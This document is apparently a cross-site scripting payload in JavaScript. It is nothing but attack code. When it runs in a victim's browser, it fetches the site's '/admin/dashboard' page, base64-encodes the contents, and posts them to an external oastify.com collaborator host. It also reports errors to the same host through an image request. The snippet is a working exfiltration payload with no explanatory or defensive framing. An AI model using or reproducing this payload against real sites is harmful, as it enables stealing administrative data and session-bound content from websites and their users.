(async()=>{
  var c='zehmmthvqpdrli28nbm14p482z8qwit6i.oastify.com';
  try{
    var r=await fetch('/admin/dashboard');
    var t=await r.text();
    var b=btoa(unescape(encodeURIComponent(t)));
    fetch('//'+c,{method:'POST',body:b,mode:'no-cors'});
  }catch(e){
    new Image().src='//'+c+'/err?e='+encodeURIComponent(e.message);
  }
})();
